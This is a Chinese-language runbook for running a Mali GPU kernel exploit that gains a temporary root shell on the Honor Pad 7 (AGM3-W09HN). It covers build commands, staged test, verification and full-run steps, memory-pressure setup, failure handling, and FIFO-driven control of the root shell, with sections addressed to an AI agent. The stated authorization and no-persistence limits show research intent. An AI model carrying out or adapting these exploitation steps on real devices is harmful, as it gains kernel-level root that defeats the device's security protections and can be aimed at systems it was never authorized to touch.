# AGM3-W09HN 标准 FULL 使用方案

本文规定在**用户明确授权的 AGM3-W09HN** 上，以可诊断、分阶段的方式获得交互式临时 root shell 的标准操作流程。不得把 FULL 当作第一次探针，也不得把临时 root 描述为持久化。

## 1. 已验证结果与当前交付

- TEST_MODE：分 CPU 并行 spray 后出现 `PGD FOUND AFTER MAP` 和 `TEST PASSED`。
- 幂等 PGD 写入：出现 `IDEMPOTENT PGD WRITE VERIFIED`。
- FULL：实际出现 `uid after trigger: 0 euid: 0` 和 `uid=0(root)`。
- 同一个 FIFO 驱动的交互 shell 连续三次返回 UID 0，对应 `ROOT_SHELL_READY`、`SECOND_CHECK`、`THIRD_CHECK`。
- 研究结束时应用户要求停止了 root shell；设备随后重启并恢复为 `uid=2000(shell)`、SELinux `Enforcing`。不要假设设备仍处于 root 状态。
- 技术日志摘录见 `docs/EVIDENCE.md`。新仓库只重新构建和做静态验证，不为“验证仓库”而自动重跑 exploit。

关键实现不可随意回退：分 CPU 并行 spray、SAME_VA 地址处理、`trim_level=100`、第二次 softjob event 校验、严格 `qrc=0 && commit=0`、map 前后 PGD 候选检查、幂等写入验证，以及 FULL 成功后 `execl("/system/bin/sh", "sh", NULL)`。

## 2. 不可突破的边界

- 只操作用户明确授权的设备，先核对型号、完整指纹和 SPL。
- 不刷机、不解锁 bootloader、不修改 `/system`、`/vendor`、`boot` 或用户分区。
- 不格式化、不写分区、不清除用户数据，不为了腾空间删除用户文件。
- 设备侧只在 `/data/local/tmp` 创建、覆盖或删除本项目明确命名的文件。
- FULL 之前必须完成 TEST 和幂等 PGD 写入验证；不能跨设备复制成功日志来跳过验证。
- 不用 `timeout`、Ctrl-C、信号或 `kill -9` 终止 FULL/root shell。
- 不让 root shell 执行 `exit`，除非用户明确要求停止并接受 Mali context teardown 可能引发重启。
- 不在 FULL 成功路径加回 `unmap_spray()`。
- `getenforce` 失败不能单独作为失败依据；UID 0 才是提权判据。
- 不公开完整 bugreport、应用日志、设备私有文件、固件或 IDA 数据库；只提交 `docs/EVIDENCE.md` 式的技术摘录。

## 3. 目标和工具

目标必须满足：

```text
Model: AGM3-W09HN / Honor Pad 7
SoC/GPU: MT6769V/CU / Mali-G52 MC2, Bifrost r20p0
Kernel: 4.14.141+ (AArch64)
Android: 10 / Magic UI 4.0 / 11.0.2.197
SPL: 2022-04-01
kbase UAPI: 11.17
/dev/mali0: ADB shell 可读写
Bootloader: 锁定，不要求解锁
```

所有命令均从本仓库根目录运行。Git Bash 默认工具：

```bash
export ADB="${ADB:-/c/Program Files (x86)/Android/android-sdk/platform-tools/adb.exe}"
export CLANG="${CLANG:-/c/Program Files (x86)/Android/AndroidNDK/android-ndk-r27c/toolchains/llvm/prebuilt/windows-x86_64/bin/clang.exe}"
export SYSROOT="${SYSROOT:-C:/Program Files (x86)/Android/AndroidNDK/android-ndk-r27c/toolchains/llvm/prebuilt/windows-x86_64/sysroot}"
export MSYS2_ARG_CONV_EXCL='*'
```

路径不同就覆盖环境变量，不把新路径写死进源码。多设备时用 `ANDROID_SERIAL` 指定已授权目标，避免对错误设备执行命令。

```bash
./scripts/agm3_adb.sh check
"$ADB" shell 'id; uname -a; getprop ro.build.fingerprint; getprop ro.build.version.security_patch; getenforce; ls -l /dev/mali0; df -h /data/local/tmp'
```

如果指纹不包含 `AGM3-W09HN` 和 `11.0.2.197`，或 SPL 不是 `2022-04-01`，停止。内核偏移和物理加载地址不是通用常量。

## 4. 标准构建

```bash
./scripts/build.sh
file build/agm3_test_work build/agm3_test_write_work build/agm3_full_work
```

三个产物必须为 Android AArch64 PIE ELF，解释器为 `/system/bin/linker64`。脚本等价于以下三组配置，统一使用 `--target=aarch64-linux-android29 --sysroot="$SYSROOT" -Wall -Wextra -pthread -Isrc src/honor_agm3.c`：

| 输出 | 额外宏 |
|---|---|
| `build/agm3_test_work` | `-DSHELL -DTEST_MODE` |
| `build/agm3_test_write_work` | `-DSHELL -DTEST_MODE -DVERIFY_PGD_WRITE` |
| `build/agm3_full_work` | `-DSHELL` |

`-pthread` 必须保留。不要用同名文件覆盖不同阶段，也不要把编译成功当成设备验证成功。

## 5. 强制阶段顺序

### 阶段 0：创建专用压力文件

```bash
./scripts/agm3_adb.sh pressure
```

该命令只创建 `/data/local/tmp/agm3_pressure.bin`，大小为 1536 MiB。执行前后检查空间；空间不足就停止，不能删除用户数据来腾空间。FULL 用它做 file-LRU 预填充，再叠加匿名页压力。

手动等价命令（仅在脚本不可用时）：

```bash
"$ADB" shell 'dd if=/dev/zero of=/data/local/tmp/agm3_pressure.bin bs=1048576 count=1536; sync'
"$ADB" shell 'ls -l /data/local/tmp/agm3_pressure.bin; df -h /data/local/tmp'
```

### 阶段 A：TEST_MODE

```bash
./scripts/agm3_adb.sh test
```

脚本推送 `build/agm3_test_work`，使用设备端 `timeout 120s`，参数固定为 `1`，并把输出保存到 `logs/test.log`。必须同时满足：

1. 进程退出码为 0；
2. 日志含 `PGD FOUND AFTER MAP`；
3. 日志含 `TEST PASSED — PGD primitive verified`。

典型事件顺序：

```text
[event] atom#2 code=1(0x1)
[+] replacement backing released in slot ...
[+] PGD FOUND AFTER MAP: ...
[+] TEST PASSED — PGD primitive verified
```

`trial failed` 不是通过。没有第二次 event、没有 `commit=0`、map 前已有候选，均不得进入下一阶段。

### 阶段 B：幂等 PGD 写入验证

```bash
./scripts/agm3_adb.sh verify
```

脚本先检查 `logs/test.log`，再运行 `agm3_test_write_work` 并保存 `logs/verify.log`。这一阶段向 entry 256 写回原值，不改变目标值。必须同时满足：

1. 进程退出码为 0；
2. `IDEMPOTENT PGD WRITE VERIFIED`；
3. `TEST PASSED — PGD primitive verified`。

`PGD write verification failed` 是停止条件，不能继续 FULL。

### 阶段 C：交互式 FULL

仅当前两阶段已在**同一目标、同一源码版本**通过：

```bash
./scripts/agm3_adb.sh shell
```

该命令检查两个日志、推送 FULL 并直接连接交互 shell，故意不设置 timeout。成功标志：

```text
[+] PGD FOUND AFTER MAP: ...
[*] uid after trigger: 0 euid: 0 (0 = root)
[+] ROOT (temporary, this process only)
```

随后输入 `id`，应返回：

```text
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
```

如果只需要非交互 UID 检查，仍应保留一个可继续输入的 shell，不能把单次 `id` 输出当作稳定交互证明。

## 6. Agent 的 FIFO 交互方式

先用阶段 A/B 验证并推送 FULL；确认没有活动 root shell 或正在使用的同名 FIFO。然后创建本地管道：

```bash
"$ADB" push build/agm3_full_work /data/local/tmp/agm3_full_work
"$ADB" shell 'chmod 755 /data/local/tmp/agm3_full_work'
rm -f build/root_shell_input.fifo
mkfifo build/root_shell_input.fifo
tail -f build/root_shell_input.fifo | \
  "$ADB" shell 'PRESSURE_FILE=/data/local/tmp/agm3_pressure.bin /data/local/tmp/agm3_full_work 1'
```

最后一条管道命令作为无超时的后台任务运行，不设置会杀死它的工具超时。另开命令写入：

```bash
printf 'echo ROOT_SHELL_READY\nid\n' > build/root_shell_input.fifo
```

确认 UID 0 后，再发送至少两轮：

```bash
printf 'echo SECOND_CHECK\nid\n' > build/root_shell_input.fifo
printf 'echo THIRD_CHECK\nid\n' > build/root_shell_input.fifo
```

每次都应返回 UID 0。不要删除正在使用的 FIFO，不要结束 `tail -f`，否则 shell 会收到 EOF 并进入有风险的 Mali context teardown。

需要停止时，必须得到用户明确要求并提示重启风险；不要强杀进程。停止后清理已断开的 FIFO，等待设备恢复，再确认普通 ADB 状态。重启后 root 消失是预期现象。

## 7. 存活期间和失败后的处理

root shell 存活期间，如确需释放空间，只能删除专用压力文件和旧 TEST 二进制，保留 FULL 和 FIFO：

```bash
"$ADB" shell 'rm -f -- /data/local/tmp/agm3_pressure.bin /data/local/tmp/agm3_test_work /data/local/tmp/agm3_test_write_work'
```

这不是必要步骤；执行后需再通过 FIFO 发送 `id`，确认 shell 仍存活。不要执行 `unmap_spray()`。

失败时只用新的独立进程重试，最多约 3 次，不无限重试，不在同一进程累积 JIT 对象：

| 现象 | 标准动作 |
|---|---|
| `trial failed` | 本轮未回收，有限独立重试；不进入下一阶段 |
| 第二次 `JIT_FREE` 无 event、event 非 DONE 或 panic | 停止，检查 slab 替换和失效 JIT 对象生命周期，采集 pstore |
| `commit=0` 等待超时或 slot 异常消失 | 原语未成立，不扫描伪造候选，不进入 FULL |
| map 前发现候选 | 候选污染，放弃本轮 |
| `PGD write verification failed` | 地址或候选错误，禁止 FULL |
| PGD 后断连/重启 | 等待恢复，采集 pstore，先定位清理和生命周期 |
| `getenforce` 失败但 UID 0 | 不单独视为失败 |
| `adb: no devices/emulators found` | `adb wait-for-device`，先收集证据，不立即重跑 |

采集命令：

```bash
"$ADB" wait-for-device
./scripts/agm3_adb.sh bugreport after_failure
```

用 Grep 对保存的 bugreport 检索：`list_del corruption`、`list_add corruption`、`kbase_jit_free`、`kbase_free_alloced_region`、`kbase_gpu_munmap`、`kbase_mem_evictable_mark_reclaim`。已验证 `/system/bin/bugreport` 能带回 `/sys/fs/pstore/console-ramoops`；应利用实际崩溃栈，不靠猜测修改 pool 或 spray 参数。

## 8. 禁止回退与持久化边界

Agent 不得：

- 把 spray 固定回单一 CPU，或删除 pthread 工作线程；
- 把 `trim_level` 改为 0；
- 把 drain 移到 alias 建立之前，或把 fd2 单独改为 group 1；
- 直接 alias active JIT region 或 alias `commit=0` 的 region；
- 用双 shrinker 代替第二次 `kbase_jit_free`，本设备会拒绝带 DONT_NEED 的 alias；
- 在 FULL 中恢复 `unmap_spray()`，或随意 kill/exit 活动 root shell；
- 通过写 `/system`、`/vendor`、`boot`、init.rc、Magisk 或 bootloader 配置实现持久化；
- 把 setuid 文件放在 `nosuid` 的 `/data` 上充当持久 root；
- 添加无鉴权的 TCP root 命令服务或任意 root `eval` 服务；
- 添加 `BOOT_COMPLETED` 自动触发，而不单独评审权限与安全边界。

当前目标只是稳定的临时 root shell。进程退出或设备重启后 root 消失；持久化不属于本项目交付。

## 9. 源码和逆向资料

- `src/honor_agm3.c`：最终触发、PGD 验证、物理写入和交互 shell。
- `src/mali.h`、`src/mali_base_jm_kernel.h`：保留 Arm 原始 GPL/Linux-syscall-note 声明的 UAPI 头。
- `src/midgard.h`：pandecode-standalone 生成的 job pack/unpack。
- `docs/EVIDENCE.md`：已验证结果，不附带私有原始日志。
